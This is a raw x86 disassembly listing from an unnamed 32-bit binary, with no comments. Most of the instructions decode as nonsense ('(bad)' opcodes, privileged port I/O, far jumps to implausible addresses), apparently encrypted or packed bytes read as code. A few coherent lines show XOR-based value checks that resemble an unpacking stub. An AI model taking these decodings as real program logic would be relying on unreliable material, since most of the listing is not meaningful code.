  40f986:	cmp    DWORD PTR ds:0x43453f,0x10
  40f98d:	jb     0x40f933
  40f993:	and    DWORD PTR ds:0x43453f,edx
  40f999:	add    eax,esi
  40f99b:	push   eax
  40f99c:	push   DWORD PTR [ebp-0x8]
  40f99f:	push   DWORD PTR [ebp-0x4]
  40f9a2:	mov    edx,DWORD PTR ds:0x414afe
  40f9a8:	jmp    0x40fd3b
  40f9ad:	pop    ebx
  40f9ae:	pop    edi
  40f9af:	cld    
  40f9b0:	sub    edi,esp
  40f9b2:	mov    ebp,0x81a66f6d
  40f9b7:	push   esi
  40f9b8:	in     eax,dx
  40f9b9:	in     eax,dx
  40f9ba:	test   BYTE PTR [ebx],cl
  40f9bc:	and    DWORD PTR [edi*4+0x79f47e7e],edx
  40f9c3:	jle    0x40fa43
  40f9c5:	ja     0x40fa2f
  40f9c7:	into   
  40f9c8:	(bad)  
  40f9c9:	xor    edx,ebp
  40f9cb:	pop    ebx
  40f9cc:	test   ebx,esp
  40f9ce:	enter  0xab61,0x33
  40f9d2:	mov    ah,BYTE PTR [edi+0x17]
  40f9d5:	retf   0xac35
  40f9d8:	cli    
  40f9d9:	pop    edi
  40f9da:	pop    ebx
  40f9db:	mov    bh,0xd8
  40f9dd:	push   ebp
  40f9de:	enter  0x1ef2,0xd
  40f9e2:	aam    0xa8
  40f9e4:	pop    es
  40f9e5:	test   DWORD PTR [edx+0x57b4b404],edi
  40f9eb:	fwait
  40f9ec:	push   eax
  40f9ed:	popf   
  40f9ee:	xlat   BYTE PTR ds:[ebx]
  40f9ef:	add    ecx,DWORD PTR [ebx]
  40f9f1:	(bad)  
  40f9f2:	mov    ebp,0x3fe463f0
  40f9f7:	popf   
  40f9f8:	sub    al,0x36
  40f9fa:	test   DWORD PTR [ebp-0x3aca963d],0x961fe6d
  40fa04:	cmp    BYTE PTR [eax],ch
  40fa06:	xlat   BYTE PTR ds:[ebx]
  40fa07:	aaa    
  40fa08:	in     eax,dx
  40fa09:	rcl    DWORD PTR [ecx-0xe],cl
  40fa0c:	mov    edx,0x73be613
  40fa11:	xchg   DWORD PTR [ecx-0xd],esp
  40fa14:	jo     0x40fa4d
  40fa16:	(bad)  
  40fa18:	cwde   
  40fa19:	jg     0x40f9ae
  40fa1b:	cmp    BYTE PTR ds:0x9649ca67,dh
  40fa21:	add    eax,0xe0fb3513
  40fa26:	inc    esi
  40fa27:	sub    edi,0x1d
  40fa2a:	add    cl,BYTE PTR [esi-0x624f0e2e]
  40fa30:	lock dec ecx
  40fa32:	lock or cl,BYTE PTR [ebp-0x16c4aa19]
  40fa39:	sub    al,0x11
  40fa3b:	repz xchg esp,eax
  40fa3d:	push   esp
  40fa3e:	mov    dh,0xaf
  40fa40:	pop    esp
  40fa41:	cmp    ebx,edx
  40fa43:	div    DWORD PTR [edi+0x5312c5dd]
  40fa49:	daa    
  40fa4a:	data16 jmp 0x40fa47
  40fa4d:	iret   
  40fa4e:	lds    eax,FWORD PTR [edx+0x36]
  40fa51:	arpl   WORD PTR [esi-0x52ac35ee],ax
  40fa57:	cmp    eax,0xbd00f8f6
  40fa5c:	icebp  
  40fa5d:	xor    ebx,DWORD PTR [eax]
  40fa5f:	xchg   ebp,eax
  40fa60:	jne    0x40fabe
  40fa62:	jp     0x40fabf
  40fa64:	mov    bh,0x25
  40fa66:	mov    ah,BYTE PTR [edx-0xd]
  40fa69:	and    al,0xc2
  40fa6b:	jmp    0x40fa60
  40fa6d:	push   ecx
  40fa6e:	aaa    
  40fa6f:	or     eax,0xd7d25b00
  40fa74:	(bad)  
  40fa75:	adc    edi,eax
  40fa77:	in     eax,0xb0
  40fa79:	out    dx,eax
  40fa7a:	push   esp
  40fa7b:	pusha  
  40fa7c:	mov    ds:0x761ac4b2,al
  40fa81:	ret    
  40fa82:	icebp  
  40fa83:	rcl    BYTE PTR [ecx+eax*1],cl
  40fa86:	call   0x4e4260aa
  40fa8b:	cld    
  40fa8c:	push   ss
  40fa8d:	sub    DWORD PTR [ebx],esp
  40fa8f:	lock imul ebx,DWORD PTR [esp+edi*1+0x6d43f97f],0xc7d24655
  40fa9b:	das    
  40fa9c:	lods   al,BYTE PTR ds:[esi]
  40fa9d:	add    esi,DWORD PTR [ecx+0x43]
  40faa0:	adc    edx,ecx
  40faa2:	add    esi,0xffffffcc
  40faa5:	gs pop ebx
  40faa7:	push   ebx
  40faa8:	sbb    BYTE PTR [ecx],ah
  40faaa:	inc    edi
  40faab:	mov    DWORD PTR ds:[eax+0x48f43cab],edi
  40fab2:	retf   
  40fab3:	add    ebx,edx
  40fab5:	sbb    al,0xae
  40fab7:	sar    DWORD PTR [esi],cl
  40fab9:	cld    
  40faba:	cmp    dl,BYTE PTR [edi]
  40fabc:	xchg   edx,eax
  40fabd:	xchg   edx,eax
  40fabe:	xchg   ecx,eax
  40fabf:	sbb    eax,0x5900190b
  40fac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fac5:	pop    esi
  40fac6:	dec    edi
  40fac7:	ret    0xbc6e
  40faca:	icebp  
  40facb:	xchg   esi,eax
  40facc:	xor    DWORD PTR [esi+ecx*2+0x45],edx
  40fad0:	fidivr DWORD PTR [eax]
  40fad2:	test   BYTE PTR [edi],dh
  40fad4:	pop    ds
  40fad5:	pop    eax
  40fad6:	pop    ebp
  40fad7:	adc    DWORD PTR [esp+ebx*8-0x7f2bc6e],esp
  40fade:	jno    0x40fb43
  40fae0:	loopne 0x40faa2
  40fae2:	cld    
  40fae3:	pop    ss
  40fae4:	les    ecx,FWORD PTR [ecx+edi*2-0x29]
  40fae8:	inc    edx
  40fae9:	mov    esi,0xc26112b3
  40faee:	loopne 0x40fa95
  40faf0:	shr    DWORD PTR [esp+edx*2+0x16],cl
  40faf4:	push   ebp
  40faf5:	xchg   esi,eax
  40faf6:	inc    ecx
  40faf7:	pop    edx
  40faf8:	mov    edi,0x9ef8940a
  40fafd:	shr    DWORD PTR [ecx],0xbe
  40fb00:	int3   
  40fb01:	adc    BYTE PTR [ecx+0xa],ch
  40fb04:	push   ecx
  40fb05:	push   ss
  40fb06:	mov    eax,0xbfd162bf
  40fb0b:	sub    BYTE PTR [esi-0x36],0xaf
  40fb0f:	mov    esi,0x446d65e
  40fb14:	adc    eax,0x67bc68d8
  40fb19:	ret    0xad8c
  40fb1c:	lds    edx,FWORD PTR [esi]
  40fb1e:	push   ecx
  40fb1f:	mov    ch,0xeb
  40fb21:	test   dl,ah
  40fb23:	les    ebp,FWORD PTR [ecx+edx*1]
  40fb26:	les    ebx,FWORD PTR [ebp-0x79fff2a2]
  40fb2c:	push   ds
  40fb2d:	sar    BYTE PTR [edx-0x84b0d63],0x45
  40fb34:	dec    esi
  40fb35:	lods   eax,DWORD PTR ds:[esi]
  40fb36:	shl    dl,0x54
  40fb39:	iret   
  40fb3a:	push   ss
  40fb3b:	test   al,0x8f
  40fb3d:	and    bh,BYTE PTR [ecx+0x29]
  40fb40:	jmp    0x40fb1e
  40fb42:	add    edx,DWORD PTR [eax+0x3e]
  40fb45:	jl     0x40fb8f
  40fb47:	push   eax
  40fb48:	ins    BYTE PTR es:[edi],dx
  40fb49:	lds    eax,FWORD PTR [bx-0x13]
  40fb4d:	test   DWORD PTR ss:[ebx-0x72bb032],esi
  40fb54:	xchg   esi,eax
  40fb55:	icebp  
  40fb56:	lock hlt 
  40fb58:	retf   0xf707
  40fb5b:	popf   
  40fb5c:	mov    bl,0x89
  40fb5e:	pop    es
  40fb5f:	xor    DWORD PTR [edx+0x6fa0b560],0xf72c8d71
  40fb69:	in     al,0x9b
  40fb6b:	sub    DWORD PTR [ebp+edx*2-0x14c40310],edx
  40fb72:	or     al,ch
  40fb74:	xor    bh,0x3c
  40fb77:	das    
  40fb78:	jmp    0xb1a5d941
  40fb7d:	imul   ebx,DWORD PTR [esi],0x69
  40fb80:	bound  edx,QWORD PTR [edi+0x46]
  40fb83:	in     eax,0x62
  40fb85:	add    ecx,DWORD PTR [edi-0x55]
  40fb88:	shl    ah,cl
  40fb8a:	cmp    DWORD PTR [esi-0x4d718bef],ecx
  40fb90:	mov    edi,0xfab18249
  40fb95:	arpl   ax,di
  40fb97:	cli    
  40fb98:	rol    BYTE PTR [edx],1
  40fb9a:	jo     0x40fb6f
  40fb9c:	stos   DWORD PTR es:[edi],eax
  40fb9d:	jnp    0x40fbf6
  40fb9f:	outs   dx,BYTE PTR ds:[esi]
  40fba0:	clc    
  40fba1:	pop    ebp
  40fba2:	xor    DWORD PTR [ebp-0x25d0a4f],ebx
  40fba8:	(bad)  
  40fba9:	push   DWORD PTR [eax]
  40fbab:	ror    DWORD PTR [ecx-0x24],0x5
  40fbaf:	and    DWORD PTR [ebp-0x7ef2aacb],esi
  40fbb5:	test   al,0x3d
  40fbb7:	mov    ebx,0xaeb4ea88
  40fbbc:	test   dl,0x1f
  40fbbf:	jmp    0xe31d:0x29a5acf3
  40fbc6:	jg     0x40fbb2
  40fbc8:	mov    ebp,0x12dae80c
  40fbcd:	cmp    ch,dl
  40fbcf:	call   FWORD PTR [ebx-0x53]
  40fbd2:	xchg   ebx,eax
  40fbd3:	cmp    BYTE PTR [edx-0x67aa041f],al
  40fbd9:	cmp    ch,dl
  40fbdb:	jbe    0x40fb82
  40fbdd:	mov    ah,0xc8
  40fbdf:	xchg   edx,eax
  40fbe0:	add    DWORD PTR [ebp-0x7b3502b6],esi
  40fbe6:	mov    bh,BYTE PTR [edi+0x38]
  40fbe9:	dec    esp
  40fbea:	inc    edx
  40fbeb:	test   esp,eax
  40fbed:	sub    eax,0x7173d502
  40fbf2:	(bad)  
  40fbf3:	sbb    eax,0xce96205c
  40fbf8:	fs or  eax,0x5c3178b2
  40fbfe:	(bad)  
  40fbff:	or     BYTE PTR [ecx+0x6e386ff],bl
  40fc05:	jno    0x40fbb8
  40fc07:	sbb    DWORD PTR [esi],ecx
  40fc09:	lahf   
  40fc0a:	inc    ebp
  40fc0b:	int    0xfe
  40fc0d:	adc    eax,0x93aa7276
  40fc12:	into   
  40fc13:	mov    fs,WORD PTR [ebx-0x54]
  40fc16:	pop    ds
  40fc17:	xchg   esi,eax
  40fc18:	in     al,0x60
  40fc1a:	pop    ebp
  40fc1b:	sbb    DWORD PTR [ecx],ebp
  40fc1d:	add    dh,cl
  40fc1f:	adc    al,0xf0
  40fc21:	adc    ecx,DWORD PTR [ecx-0x57d72478]
  40fc27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc28:	cmc    
  40fc29:	iret   
  40fc2a:	jl     0x40fbe1
  40fc2c:	mov    eax,0x8af30fe6
  40fc31:	cs dec eax
  40fc33:	mov    eax,ds:0x3a10bf1f
  40fc38:	call   0x6f59:0x414ca792
  40fc3f:	and    edi,DWORD PTR [edi-0x2f]
  40fc42:	adc    al,0xea
  40fc44:	std    
  40fc45:	ja     0x40fc15
  40fc47:	div    BYTE PTR [ebx+0x8b17deb]
  40fc4d:	jns    0x40fc2b
  40fc4f:	shr    DWORD PTR [ebp+0x6d],0x2e
  40fc53:	sti    
  40fc54:	xor    eax,0x3ddfbc34
  40fc59:	dec    ecx
  40fc5a:	lods   al,BYTE PTR ds:[esi]
  40fc5b:	ds pop ds
  40fc5d:	rol    DWORD PTR [ecx],0x99
  40fc60:	icebp  
  40fc61:	mov    eax,ds:0xaa91d41e
  40fc66:	jbe    0x40fbf5
  40fc68:	lds    edx,FWORD PTR [ebx-0x5a8ac44c]
  40fc6e:	cmp    al,BYTE PTR [ebp+edx*1+0x7b40020c]
  40fc75:	into   
  40fc76:	xor    eax,0x5880df95
  40fc7b:	pop    ebx
  40fc7c:	loope  0x40fc9d
  40fc7e:	push   es
  40fc7f:	pushf  
  40fc80:	or     edx,ebx
  40fc82:	jle    0x40fc08
  40fc84:	pop    ss
  40fc85:	inc    ebx
  40fc86:	xchg   edi,eax
  40fc87:	(bad)
  40fc8a:	xlat   BYTE PTR ds:[ebx]
  40fc8b:	rcr    esi,cl
  40fc8d:	dec    ecx
  40fc8e:	adc    al,0x7
  40fc90:	in     al,dx
  40fc91:	daa    
  40fc92:	dec    edx
  40fc93:	popf   
  40fc94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc95:	adc    bh,cl
  40fc97:	dec    ecx
  40fc98:	add    ch,ch
  40fc9a:	inc    ebx
  40fc9b:	sti    
  40fc9c:	in     eax,dx
  40fc9d:	repz addr16 pop ss
  40fca0:	mov    ebp,ebx
  40fca2:	or     ebx,DWORD PTR [ebp+0x6a430a2e]
  40fca8:	mov    dh,0x3d
  40fcaa:	pop    ss
  40fcab:	aam    0x89
  40fcad:	pop    esi
  40fcae:	add    cl,BYTE PTR [ebx-0x6fe170eb]
  40fcb4:	mul    BYTE PTR [ebx]
  40fcb6:	xor    edi,DWORD PTR [edx]
  40fcb8:	mov    bh,0xf9
  40fcba:	jg     0x40fd07
  40fcbc:	jge    0x40fc77
  40fcbe:	icebp  
  40fcbf:	stc    
  40fcc0:	add    eax,DWORD PTR [eax]
  40fcc2:	pop    eax
  40fcc3:	or     dl,dl
  40fcc5:	sbb    edx,esp
  40fcc7:	(bad)  [edx+0x73]
  40fcca:	mov    al,ds:0xa562aa62
  40fccf:	inc    edx
  40fcd0:	pop    esi
  40fcd1:	cli    
  40fcd2:	mov    dh,0x5
  40fcd4:	add    al,0x2b
  40fcd6:	mov    ebp,0x83f2ad1
  40fcdb:	jge    0x40fd3b
  40fcdd:	js     0x40fc79
  40fcdf:	inc    ebp
  40fce0:	sub    DWORD PTR [esi-0x76],ebp
  40fce3:	adc    DWORD PTR [ecx+0x499403c],ebp
  40fce9:	cmp    dl,BYTE PTR [ebx-0x66]
  40fcec:	adc    esi,DWORD PTR [eax]
  40fcee:	daa    
  40fcef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcf0:	jecxz  0x40fcad
  40fcf2:	dec    edx
  40fcf3:	mov    BYTE PTR [ebx],ch
  40fcf5:	call   DWORD PTR [edx-0x5978aa49]
  40fcfb:	mov    dl,0x6d
  40fcfd:	cld    
  40fcfe:	jb     0x40fd6d
  40fd00:	jae    0x40fd80
  40fd02:	mov    esi,DWORD PTR [ebx+0x74a167f2]
  40fd08:	mov    al,ds:0x9c2418b0
  40fd0d:	mov    cs,edx
  40fd0f:	jge    0x40fcbf
  40fd11:	add    al,0x2
  40fd13:	cmp    DWORD PTR [ebp+0x3e],esp
  40fd16:	mov    bl,0xc9
  40fd18:	mov    bh,0x85
  40fd1a:	(bad)  
  40fd1b:	mov    edi,0xc309babf
  40fd20:	fild   WORD PTR [eax+0x51]
  40fd23:	or     ch,BYTE PTR es:[ebp+0x40]
  40fd27:	stos   BYTE PTR es:[edi],al
  40fd28:	xchg   BYTE PTR [edi-0x4f],al
  40fd2b:	(bad)  [ebx+0x41bc4ed7]
  40fd31:	shr    BYTE PTR [esi-0x5c],cl
  40fd34:	cmp    ecx,DWORD PTR [edi]
  40fd36:	test   ecx,eax
  40fd38:	xchg   esp,eax
  40fd39:	push   esp
  40fd3a:	sub    al,0xe8
  40fd3c:	dec    edx
  40fd3d:	or     al,0x0
  40fd3f:	add    BYTE PTR [ebx+0x414afe0d],cl
  40fd45:	add    BYTE PTR [ebx+0x1cc89],cl
  40fd4b:	add    BYTE PTR [ecx-0x7ba74ff],cl
  40fd51:	jmp    0x410121
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp+0x10]
  40fd5c:	xor    eax,edi
  40fd5e:	add    eax,esi
  40fd60:	cmp    eax,ecx
  40fd62:	jne    0x41011e
  40fd68:	mov    eax,DWORD PTR [ebp-0x4]
  40fd6b:	xor    eax,edi
  40fd6d:	add    eax,esi
  40fd6f:	mov    ds:0x414b82,eax
  40fd74:	mov    eax,DWORD PTR [ebp-0x4]
  40fd77:	xor    eax,edi
  40fd79:	add    eax,esi
  40fd7b:	mov    ds:0x414b7a,eax
  40fd80:	push   DWORD PTR [ebp-0x8]
  40fd83:	push   DWORD PTR [ebp-0x4]
  40fd86:	call   0x408384
  40fd8b:	jmp    0x41011e
  40fd90:	in     eax,0x27
  40fd92:	ss xor bh,ah
  40fd95:	xor    esp,ebp
  40fd97:	icebp  
  40fd98:	add    DWORD PTR [eax+esi*4+0x77],edi
  40fd9c:	sbb    BYTE PTR ds:0xb882cc3b,dl
  40fda2:	jle    0x40fe22
  40fda4:	hlt    
  40fda5:	jns    0x40fe25
  40fda7:	jle    0x40fdb5
  40fda9:	lahf   
  40fdaa:	sbb    BYTE PTR [edi-0x78],cl
  40fdad:	cwde   
  40fdae:	imul   esi,DWORD PTR [edi],0xffffffec
  40fdb1:	xchg   esp,eax
  40fdb2:	data16 sahf 
  40fdb4:	ja     0x40fe20
  40fdb6:	sbb    DWORD PTR [ecx-0x71],eax
  40fdb9:	int3   
  40fdba:	in     al,dx
  40fdbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdbc:	daa    
  40fdbd:	clc    
  40fdbe:	(bad)  
  40fdbf:	imul   eax,DWORD PTR [ebx],0xc
  40fdc2:	mov    ah,0x8b
  40fdc4:	fwait
  40fdc5:	cmp    ebp,DWORD PTR [esi+0x46]
  40fdc8:	pop    esi
  40fdc9:	mov    eax,ds:0x6ed5c186
  40fdce:	es inc esi
  40fdd0:	inc    ecx
  40fdd1:	mov    edi,0xe6fb6057
  40fdd6:	xchg   edi,eax
  40fdd7:	call   0x8a4c:0x97982fee
  40fdde:	int3   
  40fddf:	add    eax,0xaab7c375
  40fde4:	pop    esi
  40fde5:	or     BYTE PTR [eax-0x1e],ah
  40fde8:	and    cl,bl
  40fdea:	adc    BYTE PTR [edx],al
  40fdec:	sbb    edi,esi
  40fdee:	mov    esi,0x7e9d0f9b
  40fdf3:	pop    ss
  40fdf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdf5:	popa   
  40fdf6:	mov    eax,0x58bf82b8
  40fdfb:	inc    ebp
  40fdfc:	push   ss
  40fdfd:	add    ebx,DWORD PTR es:[esi+ebp*2+0x797a86c8]
  40fe05:	xchg   esp,eax
  40fe06:	int3   
  40fe07:	xchg   esi,eax
  40fe08:	or     eax,0x55c19ca9
  40fe0d:	ffree  st(2)
  40fe0f:	inc    edi
  40fe10:	scas   al,BYTE PTR es:[edi]
  40fe11:	xor    eax,0xffffffef
  40fe14:	repnz ss into 
  40fe17:	xchg   ebp,eax
  40fe18:	std    
  40fe19:	retf   0x9525
  40fe1c:	lods   eax,DWORD PTR ds:[esi]
  40fe1d:	addr16 mov bl,0x20
  40fe20:	mov    ?,WORD PTR ds:0x2f264720
  40fe26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe27:	or     ecx,DWORD PTR [ecx-0x884d2f4]
  40fe2d:	ret    
  40fe2e:	ror    BYTE PTR [eax],1
  40fe30:	add    edi,DWORD PTR [ecx+ebp*8]
  40fe33:	and    eax,0x9d91892b
  40fe38:	xchg   ebp,eax
  40fe39:	or     cl,BYTE PTR [eax+0x2c]
  40fe3c:	ret    
  40fe3d:	push   es
  40fe3e:	cmp    BYTE PTR [edi+ecx*4-0x18],cl
  40fe42:	inc    eax
  40fe43:	into   
  40fe44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe45:	dec    eax
  40fe46:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40fe48:	shl    DWORD PTR [ecx-0x5c2532c1],cl
  40fe4e:	repz mov edi,0x833c11d8
  40fe54:	jnp    0x40fed3
  40fe56:	sbb    BYTE PTR [eax],cl
  40fe58:	adc    cl,BYTE PTR [edx]
  40fe5a:	dec    ecx
  40fe5b:	sbb    ebx,ebx
  40fe5d:	jb     0x40fdf3
  40fe5f:	mov    ecx,0x117d9b0b
  40fe64:	mov    cl,0x64
  40fe66:	cmp    esp,DWORD PTR cs:[edx-0x7f]
  40fe6a:	sub    dh,BYTE PTR [edi-0x3da7eff3]
  40fe70:	dec    esp
  40fe71:	add    ebp,esi
  40fe73:	push   cs
  40fe74:	lds    edx,FWORD PTR [ebx+edx*2+0x3b]
  40fe78:	mov    BYTE PTR [edx],bh
  40fe7a:	es aam 0xbe
  40fe7d:	call   0xdf600d15
  40fe82:	retf   0x24f0
  40fe85:	mov    bh,0xa2
  40fe87:	sbb    BYTE PTR [edi+ecx*1],0xe8
  40fe8b:	std    
  40fe8c:	or     BYTE PTR [ebx],cl
  40fe8e:	(bad)  
  40fe8f:	in     eax,0x1e
  40fe91:	xchg   edx,eax
  40fe92:	mov    dl,bh
  40fe94:	sub    al,0xc5
  40fe96:	xchg   esp,eax
  40fe97:	mov    bl,0x22
  40fe99:	pushf  
  40fe9a:	out    dx,eax
  40fe9b:	mov    esi,0xb3c90077
  40fea0:	mov    ecx,0xe3f4337c
  40fea5:	dec    esi
  40fea6:	pop    ss
  40fea7:	ficomp WORD PTR [ecx-0x6a]
  40feaa:	mov    dl,0xd9
  40feac:	inc    ebp
  40fead:	outs   dx,DWORD PTR ds:[esi]
  40feae:	jo     0x40fe58
  40feb0:	jmp    0x40fe4a
  40feb2:	xchg   esp,eax
  40feb3:	jl     0x40fef6
  40feb5:	pop    es
  40feb6:	in     eax,dx
  40feb7:	cwde   
  40feb8:	and    ebp,0x29fa615e
  40febe:	out    0x63,eax
  40fec0:	addr16 daa 
  40fec2:	pop    edx
  40fec3:	or     cl,BYTE PTR [esi-0x42acee2f]
  40fec9:	push   edx
  40feca:	imul   edx,DWORD PTR [esp+edx*2],0x7
  40fece:	out    0xb4,eax
  40fed0:	jae    0x40fecd
  40fed2:	mov    al,ds:0x133ed300
  40fed7:	pop    eax
  40fed8:	jl     0x40fea2
  40feda:	inc    edx
  40fedb:	inc    esp
  40fedc:	popa   
  40fedd:	call   0x9f37:0xce4c49fd
  40fee4:	inc    ebx
  40fee5:	sub    al,0x32
  40fee7:	fmul   QWORD PTR [edx+edi*4+0x62b526ac]
  40feee:	fwait
  40feef:	add    DWORD PTR [ebp+0x1b],edi
  40fef2:	push   0x16
  40fef4:	ja     0x40ff13
  40fef6:	xchg   esi,eax
  40fef7:	add    DWORD PTR [edi-0x6d81aade],esp
  40fefd:	inc    ebx
  40fefe:	pop    ebx
  40feff:	xor    edx,DWORD PTR [ebx]
  40ff01:	fmul   st,st(4)
  40ff03:	jmp    0x40ff4b
  40ff05:	ja     0x40fea7
  40ff07:	lods   al,BYTE PTR ds:[esi]
  40ff08:	dec    esi
  40ff09:	and    eax,0x6fb947d3
  40ff0e:	int    0x4e
  40ff10:	sahf   
  40ff11:	sbb    al,0x97
  40ff13:	das    
  40ff14:	(bad)  
  40ff16:	arpl   WORD PTR [edi-0x2a5b5c0a],bp
  40ff1c:	adc    dl,BYTE PTR [edx-0x10c83f27]
  40ff22:	inc    edi
  40ff23:	mov    al,0xc7
  40ff25:	cld    
  40ff26:	add    bl,BYTE PTR [ebx+0x7f]
  40ff29:	sbb    bh,BYTE PTR [esi-0x11eb909d]
  40ff2f:	cmp    al,0xdb
  40ff31:	jbe    0x40ff84
  40ff33:	cli    
  40ff34:	sbb    BYTE PTR [ebx],cl
  40ff36:	mov    DWORD PTR [ebp+eax*8+0x7c65e963],esp
  40ff3d:	or     ah,BYTE PTR [esi-0x7f15f6ce]
  40ff43:	xor    edi,DWORD PTR ds:[ebp-0x1f28c9b1]
  40ff4a:	dec    ebx
  40ff4b:	call   0xaace:0xf1e42c45
  40ff52:	cmc    
  40ff53:	retf   0x59fa
  40ff56:	push   edi
  40ff57:	je     0x40ffa4
  40ff59:	push   eax
  40ff5a:	adc    bh,cl
  40ff5c:	xchg   ecx,esi
  40ff5e:	dec    edx
  40ff5f:	push   esp
  40ff60:	loop   0x40ffb2
  40ff62:	pop    eax
  40ff63:	int    0xb2
  40ff65:	cmp    edi,DWORD PTR [ebx+0x69acf1e0]
  40ff6b:	xchg   BYTE PTR [edx-0x6df1e8af],ah
  40ff71:	jbe    0x40ff1b
  40ff73:	mov    ds:0x9c667171,eax
  40ff78:	adc    ebx,esi
  40ff7a:	shl    ebp,0x4d
  40ff7d:	dec    ebp
  40ff7e:	push   ds
  40ff7f:	sbb    DWORD PTR [ebx+0x28],ebp
  40ff82:	inc    esp
  40ff83:	inc    edx
  40ff84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff85:	jmp    0x40ffae
  40ff87:	lahf   
  40ff88:	mov    dx,ax
  40ff8b:	repnz (bad) 
  40ff8e:	outs   dx,BYTE PTR ds:[esi]
  40ff8f:	push   ebx
  40ff90:	adc    BYTE PTR [edi+0x63bb87d5],dh
  40ff96:	cmp    dh,BYTE PTR [eax-0x5b]
  40ff99:	adc    DWORD PTR [edi],0xffffffd7
  40ff9c:	pop    esi
  40ff9d:	xor    edx,ecx
  40ff9f:	add    esp,DWORD PTR [esi]
  40ffa1:	add    edi,ecx
  40ffa3:	ret    
  40ffa4:	fs pop es
  40ffa6:	xor    al,0x53
  40ffa8:	(bad)  
  40ffa9:	push   ds
  40ffaa:	cmp    al,0xed
  40ffac:	cs mov ebp,es
  40ffaf:	sub    ch,BYTE PTR [esi-0x328d85ae]
  40ffb5:	mov    bh,0xf3
  40ffb7:	adc    al,0x11
  40ffb9:	and    BYTE PTR [esi-0x35],0xac
  40ffbd:	neg    ch
  40ffbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffc0:	mov    esp,0xddcc112c
  40ffc5:	mov    edx,0x97fe423f
  40ffca:	mov    edi,0xbdb0577f
  40ffcf:	data16 jae 0x410050
  40ffd2:	test   al,0xdb
  40ffd4:	aam    0xbb
  40ffd6:	dec    eax
  40ffd7:	and    al,BYTE PTR [ebx-0xc041bb0]
  40ffdd:	xchg   ebx,eax
  40ffde:	mov    bl,0x6d
  40ffe0:	div    DWORD PTR ds:0x6150e09f
  40ffe6:	mov    ds:0x4fb706fe,eax
  40ffeb:	mov    edi,0x5b730e09
  40fff0:	sub    al,0x58
  40fff2:	je     0x40ff91
  40fff4:	sbb    dl,BYTE PTR [ecx-0x96a1a5e]
  40fffa:	int    0x67
  40fffc:	and    cl,BYTE PTR [edx+0xb]
  40ffff:	mov    esi,0xfa271a8
  410004:	xchg   bh,ah
  410006:	inc    esi
  410007:	adc    al,0x46
  410009:	shr    DWORD PTR [eax+0x6c8f9022],1
  41000f:	outs   dx,BYTE PTR ds:[esi]
  410010:	ja     0x40fffb
  410012:	js     0x40fff8
  410014:	jns    0x410028
  410016:	int3   
  410017:	inc    esi
  410018:	rep ins DWORD PTR es:[edi],dx
  41001a:	xchg   esi,eax
  41001b:	jle    0x410038
  41001d:	aaa    
  41001e:	cmp    eax,0xa8115192
  410023:	mov    edx,0x4db5aea
  410028:	int3   
  410029:	push   ds
  41002a:	lods   al,BYTE PTR ds:[esi]
  41002b:	cmp    cl,BYTE PTR [edi-0x4ba75dfd]
  410031:	adc    BYTE PTR [ebp-0x74],0xa5
  410035:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410036:	cmp    eax,edi
  410038:	xchg   DWORD PTR [ecx-0x72],esi
  41003b:	js     0x40ffc6
  41003d:	and    DWORD PTR [edx+eax*4],edx
  410040:	ret    0x2568
  410043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410044:	inc    edi
  410045:	or     al,cl
  410047:	jg     0x40ffca
  410049:	into   
  41004a:	inc    esp
  41004b:	adc    esi,DWORD PTR [ebx]
  41004d:	retf   
  41004e:	jle    0x410050
  410050:	scas   al,BYTE PTR es:[edi]
  410051:	xor    esi,DWORD PTR [edi+0x71]
  410054:	sub    ebx,DWORD PTR [esi]
  410056:	jo     0x4100b7
  410058:	mov    DWORD PTR [edi-0x1b],edx
  41005b:	out    dx,eax
  41005c:	cli    
  41005d:	mov    edx,0xb9a686e8
  410062:	(bad)  
  410063:	and    cl,BYTE PTR [esp-0x1b9e5b87]
  41006a:	imul   esp,DWORD PTR [edi-0x30],0x77ff93d2
  410071:	push   edi
  410072:	and    al,0x89
  410074:	mov    cs,WORD PTR [edx-0x2d]
  410077:	push   ebp
  410078:	cmc    
  410079:	sbb    BYTE PTR [edi-0x1d5ff381],0xe6
  410080:	es sahf 
  410082:	(bad)  [esp+ebx*8-0x5]
  410086:	ret    
  410087:	outs   dx,DWORD PTR ds:[esi]
  410088:	jmp    0xb57e:0x88782df9
  41008f:	sbb    DWORD PTR [edi+0x23],esi
  410092:	add    ebx,edx
  410094:	and    ebp,DWORD PTR [ebx+0x45f06afa]
  41009a:	fiadd  DWORD PTR [eax+0x620e8abc]
  4100a0:	sbb    al,0x6d
  4100a2:	push   esp
  4100a3:	and    DWORD PTR [ecx+0x73],ebx
  4100a6:	scas   eax,DWORD PTR es:[edi]
  4100a7:	inc    ecx
  4100a8:	mov    dh,0x59
  4100aa:	fisttp DWORD PTR [ebx-0x2ade6d20]
  4100b0:	dec    edi
  4100b1:	dec    BYTE PTR [ecx]
  4100b3:	xchg   esi,eax
  4100b4:	psubw  mm6,QWORD PTR [eax+0x13c007f3]
  4100bb:	popa   
  4100bc:	adc    BYTE PTR [edx],dh
  4100be:	pushf  
  4100bf:	lahf   
  4100c0:	push   eax
  4100c1:	pushf  
  4100c2:	or     BYTE PTR [ebx],0x55
  4100c5:	je     0x4100d6
  4100c7:	cmp    edx,0xf94622d6
  4100cd:	das    
  4100ce:	arpl   bx,di
  4100d0:	popf   
  4100d1:	loopne 0x410057
  4100d3:	push   edi
  4100d4:	imul   ecx,DWORD PTR [edi-0x74],0xffffffab
  4100d8:	out    dx,al
  4100d9:	pop    ds
  4100da:	mov    DWORD PTR [esi+0x53],eax
  4100dd:	adc    BYTE PTR [ebx+0x71e869df],dl
  4100e3:	mov    ebx,0x3f7312f9
